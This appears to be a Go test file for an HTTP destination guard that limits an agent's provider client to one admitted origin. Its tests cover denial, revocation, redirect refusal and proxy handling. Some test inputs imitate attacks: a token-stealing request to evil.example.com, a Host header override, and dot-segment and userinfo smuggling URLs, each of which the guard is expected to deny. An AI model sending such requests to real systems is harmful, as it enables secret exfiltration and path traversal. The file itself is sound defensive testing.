package provider

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// spyDelegate is the observation point for every zero-request claim: it
// counts RoundTrip invocations and returns a canned response without dialing.
// The counter lives in the delegate, below the guard, sharing no code with
// admission (anti-tautology).
type spyDelegate struct {
	calls   atomic.Int64
	lastReq atomic.Pointer[http.Request]
}

func (s *spyDelegate) RoundTrip(req *http.Request) (*http.Response, error) {
	s.calls.Add(1)
	s.lastReq.Store(req)
	return &http.Response{
		StatusCode: http.StatusOK,
		Body:       http.NoBody,
		Header:     make(http.Header),
		Request:    req,
	}, nil
}

// guardedForTest wires a gate with one admitted edge and returns a guarded
// client whose delegate is the spy.
func guardedForTest(t *testing.T, purpose, providerName, baseURL string) (*http.Client, *DestinationGate, Destination, *spyDelegate) {
	t.Helper()
	dest := mustDest(t, providerName, baseURL)
	gate := installTestGate(t, DestinationEdge{Purpose: purpose, Destination: dest})
	spy := &spyDelegate{}
	client, err := GuardHTTPClient(gate, dest, &http.Client{Transport: spy})
	if err != nil {
		t.Fatal(err)
	}
	return client, gate, dest, spy
}

func mustReq(t *testing.T, ctx context.Context, rawURL string) *http.Request {
	t.Helper()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		t.Fatal(err)
	}
	return req
}

func TestGuardHTTPClientValidatesInputs(t *testing.T) {
	dest := mustDest(t, "opencode", "https://opencode.ai/zen/go")
	gate := NewDestinationGate()

	if _, err := GuardHTTPClient(nil, dest, nil); err == nil {
		t.Error("nil gate accepted")
	}
	if _, err := GuardHTTPClient(gate, Destination{}, nil); err == nil {
		t.Error("zero destination accepted")
	}
	jarred := &http.Client{}
	jarred.Jar = staticJar{}
	if _, err := GuardHTTPClient(gate, dest, jarred); err == nil {
		t.Error("cookie jar accepted; the guard cannot vouch for jar behavior")
	}
	// A loopback destination needs proxy stripping and dial validation, which
	// require an *http.Transport delegate; an opaque RoundTripper cannot be
	// retrofitted, so it must be refused rather than silently unguarded.
	local := mustDest(t, "llamacpp", "http://localhost:8090")
	if _, err := GuardHTTPClient(gate, local, &http.Client{Transport: &spyDelegate{}}); err == nil {
		t.Error("loopback destination with opaque delegate accepted")
	}
	// A remote destination wraps an opaque delegate as-is: the guard is
	// outermost, so denial still precedes it.
	if _, err := GuardHTTPClient(gate, dest, &http.Client{Transport: &spyDelegate{}}); err != nil {
		t.Errorf("remote destination with opaque delegate refused: %v", err)
	}
}

func TestGuardHTTPClientRejectsLoopbackTLSDialHooks(t *testing.T) {
	dest := mustDest(t, "llamacpp", "https://localhost:8443")
	gate := NewDestinationGate()

	tests := []struct {
		name      string
		transport *http.Transport
	}{
		{
			name: "DialTLSContext",
			transport: &http.Transport{DialTLSContext: func(context.Context, string, string) (net.Conn, error) {
				return nil, errors.New("must not dial")
			}},
		},
		{
			name: "DialTLS",
			transport: &http.Transport{DialTLS: func(string, string) (net.Conn, error) { //nolint:staticcheck // SA1019: the deprecated hook is the case under test.
				return nil, errors.New("must not dial")
			}},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if _, err := GuardHTTPClient(gate, dest, &http.Client{Transport: tt.transport}); !errors.Is(err, ErrDestinationInvalid) {
				t.Errorf("GuardHTTPClient(loopback transport with %s) = %v, want ErrDestinationInvalid", tt.name, err)
			}
		})
	}
}

// #665: "localhost" is loopback by name (RFC 6761 §6.3). The guard dials
// 127.0.0.1, then ::1, on the destination's port and never hands the name to
// the dialer, so no hosts file or resolver can redirect it.
func TestGuardedLocalhostDialsLoopbackByName(t *testing.T) {
	dest := mustDest(t, "llamacpp", "https://localhost:8443")
	gate := installTestGate(t, DestinationEdge{Purpose: "agent", Destination: dest})
	var mu sync.Mutex
	var dialed []string
	base := &http.Client{Transport: &http.Transport{
		DialContext: func(_ context.Context, _, addr string) (net.Conn, error) {
			mu.Lock()
			dialed = append(dialed, addr)
			mu.Unlock()
			return nil, errors.New("refused by test")
		},
	}}
	client, err := GuardHTTPClient(gate, dest, base)
	if err != nil {
		t.Fatal(err)
	}
	ctx, err := gate.Bind(context.Background(), "agent", "llamacpp")
	if err != nil {
		t.Fatal(err)
	}

	resp, err := client.Do(mustReq(t, ctx, "https://localhost:8443/v1/models"))
	if err == nil {
		_ = resp.Body.Close()
		t.Fatal("client.Do succeeded through a dialer that refuses every address")
	}
	if errors.Is(err, ErrDestinationDenied) {
		t.Errorf("localhost dial failure = %v, want an outage, not a destination denial", err)
	}
	mu.Lock()
	defer mu.Unlock()
	if want := []string{"127.0.0.1:8443", "[::1]:8443"}; !slices.Equal(dialed, want) {
		t.Errorf("dialed %q, want %q", dialed, want)
	}
}

type staticJar struct{}

func (staticJar) SetCookies(_ *url.URL, _ []*http.Cookie) {}
func (staticJar) Cookies(_ *url.URL) []*http.Cookie       { return nil }

// I1/M1: no capability means zero delegate invocations — the request dies in
// the guard, before any transport, dialer, or proxy.
func TestGuardedTransportDeniesBareContext(t *testing.T) {
	client, _, _, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")

	_, err := client.Transport.RoundTrip(mustReq(t, context.Background(), "https://opencode.ai/zen/go/v1/chat/completions"))
	if !errors.Is(err, ErrDestinationDenied) {
		t.Fatalf("bare context = %v, want ErrDestinationDenied", err)
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate called %d times on denial, want 0", got)
	}

	// Callers use client.Do, which wraps transport errors in *url.Error.
	// errors.Is must survive that wrap — it is the match every caller's
	// denial handling depends on, so it is pinned here, not assumed.
	_, err = client.Do(mustReq(t, context.Background(), "https://opencode.ai/zen/go/v1/chat/completions"))
	if !errors.Is(err, ErrDestinationDenied) {
		t.Fatalf("client.Do wrap broke errors.Is: %v", err)
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate called %d times via Do denial, want 0", got)
	}
}

func TestGuardedTransportAllowsBoundRequestIntact(t *testing.T) {
	client, gate, _, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")
	ctx, err := gate.Bind(context.Background(), "agent", "opencode")
	if err != nil {
		t.Fatal(err)
	}

	req := mustReq(t, ctx, "https://opencode.ai/zen/go/v1/chat/completions")
	req.Header.Set("Authorization", "Bearer test-token")
	resp, err := client.Transport.RoundTrip(req)
	if err != nil {
		t.Fatalf("bound request denied: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if got := spy.calls.Load(); got != 1 {
		t.Fatalf("delegate called %d times, want 1", got)
	}
	seen := spy.lastReq.Load()
	if seen.URL.String() != "https://opencode.ai/zen/go/v1/chat/completions" {
		t.Errorf("guard rewrote the URL: %s", seen.URL)
	}
	if seen.Header.Get("Authorization") != "Bearer test-token" {
		t.Error("guard dropped the Authorization header")
	}
}

func TestGuardedTransportRejectsRequestHostOverride(t *testing.T) {
	client, gate, _, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")
	ctx, err := gate.Bind(context.Background(), "agent", "opencode")
	if err != nil {
		t.Fatal(err)
	}
	req := mustReq(t, ctx, "https://opencode.ai/zen/go/v1/chat/completions")
	req.Host = "evil.example.com"

	_, err = client.Transport.RoundTrip(req)
	if !errors.Is(err, ErrDestinationDenied) {
		t.Errorf("RoundTrip(Request.Host=%q) = %v, want ErrDestinationDenied", req.Host, err)
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate calls after Request.Host override = %d, want 0", got)
	}
}

// The guard is bound to ONE origin and base path. A capability for that
// destination must not let a request slip to any other target — host, port,
// scheme, sibling path, prefix trick, or dot-segment escape.
func TestGuardedTransportRejectsOffTargetRequests(t *testing.T) {
	client, gate, _, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")
	ctx, err := gate.Bind(context.Background(), "agent", "opencode")
	if err != nil {
		t.Fatal(err)
	}

	for name, raw := range map[string]string{
		"different host":         "https://evil.example.com/zen/go/v1",
		"different scheme":       "http://opencode.ai/zen/go/v1",
		"explicit foreign port":  "https://opencode.ai:8443/zen/go/v1",
		"outside base path":      "https://opencode.ai/other/v1",
		"base path prefix trick": "https://opencode.ai/zen/gother",
		"parent of base":         "https://opencode.ai/zen",
		"root":                   "https://opencode.ai/",
		"dot segment escape":     "https://opencode.ai/zen/go/../../admin",
		"escaped dot segment":    "https://opencode.ai/zen/go/%2e%2e/admin",
		"userinfo smuggled":      "https://user:pw@opencode.ai/zen/go/v1",
	} {
		t.Run(name, func(t *testing.T) {
			_, err := client.Transport.RoundTrip(mustReq(t, ctx, raw))
			if !errors.Is(err, ErrDestinationDenied) {
				t.Fatalf("%s = %v, want ErrDestinationDenied", name, err)
			}
		})
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate called %d times across off-target requests, want 0", got)
	}
}

// Equivalent spellings of the bound origin are the same destination and must
// pass — otherwise the guard would depend on the provider client reproducing
// one exact spelling.
func TestGuardedTransportAcceptsEquivalentOriginSpellings(t *testing.T) {
	client, gate, _, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")
	ctx, err := gate.Bind(context.Background(), "agent", "opencode")
	if err != nil {
		t.Fatal(err)
	}

	for _, raw := range []string{
		"https://OPENCODE.AI/zen/go/v1",
		"https://opencode.ai:443/zen/go/v1",
		"https://opencode.ai/zen/go",
		"https://opencode.ai/zen/go/",
	} {
		t.Run(raw, func(t *testing.T) {
			resp, err := client.Transport.RoundTrip(mustReq(t, ctx, raw))
			if err != nil {
				t.Fatalf("equivalent spelling denied: %v", err)
			}
			_ = resp.Body.Close()
		})
	}
	if got := spy.calls.Load(); got != 4 {
		t.Errorf("delegate called %d times, want 4", got)
	}
}

// M17 at the transport: a capability from a cleared generation dies here too.
func TestGuardedTransportDeniesStaleCapability(t *testing.T) {
	client, gate, _, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")
	ctx, err := gate.Bind(context.Background(), "agent", "opencode")
	if err != nil {
		t.Fatal(err)
	}
	gate.Clear()

	_, err = client.Transport.RoundTrip(mustReq(t, ctx, "https://opencode.ai/zen/go/v1"))
	if !errors.Is(err, ErrDestinationDenied) {
		t.Fatalf("stale capability = %v, want ErrDestinationDenied", err)
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate called %d times, want 0", got)
	}
}

// A capability bound to a DIFFERENT provider at the same URL must not pass a
// transport bound to this one — consent is per {provider, base URL}.
func TestGuardedTransportDeniesCrossProviderCapability(t *testing.T) {
	shared := "https://opencode.ai/zen/go"
	a := mustDest(t, "alpha", shared)
	b := mustDest(t, "beta", shared)
	gate := installTestGate(t,
		DestinationEdge{Purpose: "agent", Destination: a},
		DestinationEdge{Purpose: "agent", Destination: b},
	)
	spy := &spyDelegate{}
	clientA, err := GuardHTTPClient(gate, a, &http.Client{Transport: spy})
	if err != nil {
		t.Fatal(err)
	}
	ctxB, err := gate.Bind(context.Background(), "agent", "beta")
	if err != nil {
		t.Fatal(err)
	}

	_, err = clientA.Transport.RoundTrip(mustReq(t, ctxB, shared+"/v1"))
	if !errors.Is(err, ErrDestinationDenied) {
		t.Fatalf("cross-provider capability = %v, want ErrDestinationDenied", err)
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate called %d times, want 0", got)
	}
}

// I13/M13: every redirect is refused, and the redirect target receives zero
// requests — an admitted origin cannot transfer authority to the target.
func TestGuardHTTPClientRefusesRedirects(t *testing.T) {
	var targetHits atomic.Int64
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		targetHits.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer target.Close()

	// /self redirects WITHIN the origin to a page that answers 200. That is
	// the case only CheckRedirect can stop: the follow-up request targets the
	// bound origin, so the transport's own binding check would let it
	// through, and without the refusal the client would surface a clean 200.
	// A fixture that redirects everything would mask a removed CheckRedirect
	// behind the transport's cross-origin denial — proven by mutation.
	redirecting := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/self":
			http.Redirect(w, r, "/landed", http.StatusFound)
		case "/landed":
			w.WriteHeader(http.StatusOK)
		default:
			http.Redirect(w, r, target.URL, http.StatusFound)
		}
	}))
	defer redirecting.Close()

	dest := mustDest(t, "llamacpp", redirecting.URL)
	gate := installTestGate(t, DestinationEdge{Purpose: "agent", Destination: dest})
	client, err := GuardHTTPClient(gate, dest, nil)
	if err != nil {
		t.Fatal(err)
	}
	ctx, err := gate.Bind(context.Background(), "agent", "llamacpp")
	if err != nil {
		t.Fatal(err)
	}

	t.Run("cross-origin redirect refused", func(t *testing.T) {
		resp, err := client.Do(mustReq(t, ctx, redirecting.URL+"/x"))
		if err == nil {
			_ = resp.Body.Close()
			t.Fatal("redirect to a foreign origin was followed")
		}
		if got := targetHits.Load(); got != 0 {
			t.Errorf("redirect target received %d requests, want 0", got)
		}
	})

	t.Run("same-origin redirect refused too", func(t *testing.T) {
		resp, err := client.Do(mustReq(t, ctx, redirecting.URL+"/self"))
		if err == nil {
			_ = resp.Body.Close()
			t.Fatal("same-origin redirect was followed")
		}
	})
}

// I12/M12: loopback traffic never consults a proxy, even when the base
// transport carries one.
func TestGuardedLoopbackBypassesProxy(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	var proxyConsults atomic.Int64
	base := &http.Client{Transport: &http.Transport{
		Proxy: func(*http.Request) (*url.URL, error) {
			proxyConsults.Add(1)
			return nil, fmt.Errorf("proxy must not be consulted for loopback")
		},
	}}

	dest := mustDest(t, "llamacpp", srv.URL)
	gate := installTestGate(t, DestinationEdge{Purpose: "agent", Destination: dest})
	client, err := GuardHTTPClient(gate, dest, base)
	if err != nil {
		t.Fatal(err)
	}
	ctx, err := gate.Bind(context.Background(), "agent", "llamacpp")
	if err != nil {
		t.Fatal(err)
	}

	resp, err := client.Do(mustReq(t, ctx, srv.URL+"/v1/models"))
	if err != nil {
		t.Fatalf("loopback request failed: %v", err)
	}
	_ = resp.Body.Close()
	if got := proxyConsults.Load(); got != 0 {
		t.Errorf("proxy consulted %d times for loopback, want 0", got)
	}
}

// D13: admitted REMOTE traffic keeps the operator's configured proxy, and a
// denied request never reaches it (M24).
func TestGuardedRemoteKeepsProxyAndDenialNeverReachesIt(t *testing.T) {
	var proxied atomic.Int64
	var lastHost atomic.Pointer[string]
	proxySrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		proxied.Add(1)
		h := r.Host
		lastHost.Store(&h)
		w.WriteHeader(http.StatusOK)
	}))
	defer proxySrv.Close()
	proxyURL, err := url.Parse(proxySrv.URL)
	if err != nil {
		t.Fatal(err)
	}

	base := &http.Client{Transport: &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}}
	dest := mustDest(t, "opencode", "http://remote.invalid/zen/go")
	gate := installTestGate(t, DestinationEdge{Purpose: "agent", Destination: dest})
	client, err := GuardHTTPClient(gate, dest, base)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("denied request never reaches the proxy", func(t *testing.T) {
		_, err := client.Transport.RoundTrip(mustReq(t, context.Background(), "http://remote.invalid/zen/go/v1"))
		if !errors.Is(err, ErrDestinationDenied) {
			t.Fatalf("bare context = %v, want ErrDestinationDenied", err)
		}
		if got := proxied.Load(); got != 0 {
			t.Errorf("proxy received %d requests from a denied call, want 0", got)
		}
	})

	t.Run("admitted request keeps the proxy", func(t *testing.T) {
		ctx, err := gate.Bind(context.Background(), "agent", "opencode")
		if err != nil {
			t.Fatal(err)
		}
		resp, err := client.Do(mustReq(t, ctx, "http://remote.invalid/zen/go/v1"))
		if err != nil {
			t.Fatalf("admitted remote request through proxy: %v", err)
		}
		_ = resp.Body.Close()
		if got := proxied.Load(); got != 1 {
			t.Fatalf("proxy received %d requests, want 1", got)
		}
		if h := lastHost.Load(); h == nil || *h != "remote.invalid" {
			t.Errorf("proxy saw host %v, want remote.invalid", lastHost.Load())
		}
	})
}

// I12: a "localhost" destination dials only loopback addresses. A local
// backend often listens on one stack (llama-server and Ollama bind
// 127.0.0.1 by default), so the guard must reach a server on either one, as
// the unguarded client did.
func TestGuardedLocalhostReachesEitherLoopbackStack(t *testing.T) {
	for _, stack := range []struct{ name, listen string }{
		{"IPv4 only", "127.0.0.1:0"},
		{"IPv6 only", "[::1]:0"},
	} {
		t.Run(stack.name, func(t *testing.T) {
			ln, err := net.Listen("tcp", stack.listen)
			if err != nil {
				t.Skipf("cannot listen on %s: %v", stack.listen, err)
			}
			// A unique body proves the fixture answered: an unrelated server on
			// the other stack's same port must not satisfy the test.
			marker := "fixture " + stack.listen
			srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				_, _ = io.WriteString(w, marker)
			})}
			go func() { _ = srv.Serve(ln) }()
			defer func() { _ = srv.Close() }()

			baseURL := fmt.Sprintf("http://localhost:%d", ln.Addr().(*net.TCPAddr).Port)
			dest := mustDest(t, "llamacpp", baseURL)
			gate := installTestGate(t, DestinationEdge{Purpose: "agent", Destination: dest})
			client, err := GuardHTTPClient(gate, dest, &http.Client{Timeout: 5 * time.Second})
			if err != nil {
				t.Fatal(err)
			}
			ctx, err := gate.Bind(context.Background(), "agent", "llamacpp")
			if err != nil {
				t.Fatal(err)
			}
			resp, err := client.Do(mustReq(t, ctx, baseURL+"/v1/models"))
			if err != nil {
				t.Fatalf("localhost did not reach a server on %s: %v", stack.listen, err)
			}
			body, err := io.ReadAll(resp.Body)
			_ = resp.Body.Close()
			if err != nil || string(body) != marker {
				t.Fatalf("localhost reached %q (err %v), want the fixture on %s", body, err, stack.listen)
			}
		})
	}
}

// I19/M20: the guard's own errors never echo the request URL, whose query
// may carry request data; they name only the canonical destination and the
// purpose.
func TestGuardedTransportErrorsNeverEchoRequestURL(t *testing.T) {
	client, gate, _, _ := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")

	t.Run("denial with bare context", func(t *testing.T) {
		_, err := client.Transport.RoundTrip(mustReq(t, context.Background(),
			"https://opencode.ai/zen/go/v1?token="+canarySecret))
		if err == nil {
			t.Fatal("want denial")
		}
		if strings.Contains(err.Error(), canarySecret) {
			t.Errorf("guard error leaked the request query: %s", err)
		}
	})

	t.Run("off-target denial with bound context", func(t *testing.T) {
		ctx, err := gate.Bind(context.Background(), "agent", "opencode")
		if err != nil {
			t.Fatal(err)
		}
		_, err = client.Transport.RoundTrip(mustReq(t, ctx,
			"https://evil.example.com/steal?token="+canarySecret))
		if err == nil {
			t.Fatal("want denial")
		}
		if strings.Contains(err.Error(), canarySecret) || strings.Contains(err.Error(), "evil.example.com") {
			t.Errorf("guard error leaked the off-target URL: %s", err)
		}
	})
}

// M2/#376: an additive Extend must not revoke capabilities already issued.
// A request bound BEFORE the extension still reaches the delegate afterwards,
// and the edge the extension added works — both observed at the delegate,
// below the guard, not in the gate.
func TestGuardedTransportExtendPreservesInFlightCapability(t *testing.T) {
	oldDest := mustDest(t, "opencode", "https://opencode.ai/zen/go")
	newDest := mustDest(t, "other", "https://other.example.com")
	oldEdge := DestinationEdge{Purpose: "agent", Destination: oldDest}
	newEdge := DestinationEdge{Purpose: "agent", Destination: newDest}

	gate := installTestGate(t, oldEdge)
	oldSpy := &spyDelegate{}
	oldClient, err := GuardHTTPClient(gate, oldDest, &http.Client{Transport: oldSpy})
	if err != nil {
		t.Fatal(err)
	}
	// Bound before the extension: this stands in for the in-flight request.
	inFlight, err := gate.Bind(context.Background(), "agent", "opencode")
	if err != nil {
		t.Fatal(err)
	}

	extended, err := NewDestinationManifest(oldEdge, newEdge)
	if err != nil {
		t.Fatal(err)
	}
	if err := gate.Extend(NewDestinationPolicy(oldDest, newDest), extended); err != nil {
		t.Fatalf("Extend with a valid superset: %v", err)
	}

	resp, err := oldClient.Transport.RoundTrip(mustReq(t, inFlight, "https://opencode.ai/zen/go/v1/chat/completions"))
	if err != nil {
		t.Fatalf("capability bound before Extend denied after it: %v", err)
	}
	_ = resp.Body.Close()
	if got := oldSpy.calls.Load(); got != 1 {
		t.Errorf("pre-Extend delegate called %d times, want 1", got)
	}

	newSpy := &spyDelegate{}
	newClient, err := GuardHTTPClient(gate, newDest, &http.Client{Transport: newSpy})
	if err != nil {
		t.Fatal(err)
	}
	newCtx, err := gate.Bind(context.Background(), "agent", "other")
	if err != nil {
		t.Fatalf("Bind on the edge Extend added: %v", err)
	}
	resp, err = newClient.Transport.RoundTrip(mustReq(t, newCtx, "https://other.example.com/v1/chat/completions"))
	if err != nil {
		t.Fatalf("edge added by Extend denied: %v", err)
	}
	_ = resp.Body.Close()
	if got := newSpy.calls.Load(); got != 1 {
		t.Errorf("post-Extend delegate called %d times, want 1", got)
	}
}

// A capability value that never came from Bind carries no revocation token.
// The transport must fail closed on it: zero delegate invocations, whatever
// strings the value names.
func TestGuardedTransportDeniesCapabilityWithoutToken(t *testing.T) {
	client, _, dest, spy := guardedForTest(t, "agent", "opencode", "https://opencode.ai/zen/go")
	forged := context.WithValue(context.Background(), destCapabilityCtxKey{}, &destinationCapability{
		purpose:  "agent",
		provider: "opencode",
		dest:     dest,
	})

	_, err := client.Transport.RoundTrip(mustReq(t, forged, "https://opencode.ai/zen/go/v1"))
	if !errors.Is(err, ErrDestinationDenied) {
		t.Fatalf("capability with a zero token = %v, want ErrDestinationDenied", err)
	}
	if got := spy.calls.Load(); got != 0 {
		t.Errorf("delegate called %d times, want 0", got)
	}
}

// closeRecorder is a request body that counts Close calls. It stands in for
// a pipe-backed streaming upload, whose writer goroutine unblocks only when
// the reader side is closed.
type closeRecorder struct {
	io.Reader
	closes atomic.Int64
}

func (c *closeRecorder) Close() error {
	c.closes.Add(1)
	return nil
}

// #655: the http.RoundTripper contract says RoundTrip always closes the
// request body, errors included. http.Client never closes it after a
// transport error, so a denial that skipped Close would leak a pipe-backed
// body's writer goroutine. Every denial (capability refusals and target
// refusals alike) closes the body exactly once, and an admitted request
// leaves it to the delegate, which owns it from there.
func TestGuardedTransportDenialClosesRequestBody(t *testing.T) {
	const base = "https://opencode.ai/zen/go"
	bind := func(t *testing.T, gate *DestinationGate) context.Context {
		t.Helper()
		ctx, err := gate.Bind(context.Background(), "agent", "opencode")
		if err != nil {
			t.Fatal(err)
		}
		return ctx
	}

	for _, tc := range []struct {
		name string
		req  func(t *testing.T, gate *DestinationGate, dest Destination) *http.Request
	}{
		{"no capability", func(t *testing.T, _ *DestinationGate, _ Destination) *http.Request {
			return mustReq(t, context.Background(), base+"/v1")
		}},
		{"revoked capability", func(t *testing.T, gate *DestinationGate, _ Destination) *http.Request {
			ctx := bind(t, gate)
			gate.Clear()
			return mustReq(t, ctx, base+"/v1")
		}},
		{"capability without token", func(t *testing.T, _ *DestinationGate, dest Destination) *http.Request {
			forged := context.WithValue(context.Background(), destCapabilityCtxKey{}, &destinationCapability{
				purpose: "agent", provider: "opencode", dest: dest,
			})
			return mustReq(t, forged, base+"/v1")
		}},
		{"Request.Host override", func(t *testing.T, gate *DestinationGate, _ Destination) *http.Request {
			req := mustReq(t, bind(t, gate), base+"/v1")
			req.Host = "evil.example.com"
			return req
		}},
		{"off-target URL", func(t *testing.T, gate *DestinationGate, _ Destination) *http.Request {
			return mustReq(t, bind(t, gate), "https://evil.example.com/zen/go/v1")
		}},
		{"nil URL", func(t *testing.T, gate *DestinationGate, _ Destination) *http.Request {
			req := mustReq(t, bind(t, gate), base+"/v1")
			req.URL = nil
			return req
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			client, gate, dest, spy := guardedForTest(t, "agent", "opencode", base)
			req := tc.req(t, gate, dest)
			body := &closeRecorder{Reader: strings.NewReader(`{"stream":true}`)}
			req.Method, req.Body = http.MethodPost, body

			if _, err := client.Transport.RoundTrip(req); !errors.Is(err, ErrDestinationDenied) {
				t.Fatalf("RoundTrip = %v, want ErrDestinationDenied", err)
			}
			if got := spy.calls.Load(); got != 0 {
				t.Fatalf("delegate called %d times, want 0", got)
			}
			if got := body.closes.Load(); got != 1 {
				t.Errorf("request body closed %d times on denial, want 1", got)
			}
		})
	}

	t.Run("admitted request leaves body to delegate", func(t *testing.T) {
		client, gate, _, spy := guardedForTest(t, "agent", "opencode", base)
		req := mustReq(t, bind(t, gate), base+"/v1")
		body := &closeRecorder{Reader: strings.NewReader(`{"stream":true}`)}
		req.Method, req.Body = http.MethodPost, body

		resp, err := client.Transport.RoundTrip(req)
		if err != nil {
			t.Fatalf("admitted request denied: %v", err)
		}
		_ = resp.Body.Close()
		if got := spy.calls.Load(); got != 1 {
			t.Fatalf("delegate called %d times, want 1", got)
		}
		// The spy never closes, so any close here came from the guard.
		if got := body.closes.Load(); got != 0 {
			t.Errorf("guard closed an admitted request body %d times, want 0", got)
		}
	})
}
